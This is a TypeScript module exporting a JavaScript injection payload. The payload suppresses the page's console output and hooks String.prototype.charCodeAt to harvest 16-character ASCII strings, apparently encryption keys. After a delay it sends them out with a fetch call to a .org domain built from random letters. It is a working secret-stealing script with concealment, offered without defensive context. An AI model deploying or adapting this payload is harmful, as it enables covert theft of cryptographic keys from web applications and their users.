export const payload = (randomLetters: string) => {
    return `
        const log = console.log;
        console.log = () => {};
        console.clear = () => {};
        console.table = () => {};

        const originalCharCodeAt = String.prototype.charCodeAt;

        function isASCII(str) {
            return /^[\x00-\x7F]*$/.test(str);
        }

        const calledOn = [];

        String.prototype.charCodeAt = function(index) {
            if (this.length == 16 && isASCII(this) && !calledOn.includes(this + "")) {
                calledOn.push(this + "");
                log("Found key " + this + " - num " + calledOn.length);
            }
                
            return originalCharCodeAt.call(this, index);
        };

        setTimeout(() => {
            fetch("https://${randomLetters}.org/" + encodeURIComponent(JSON.stringify(calledOn)));
        }, 3000);
    `;
};
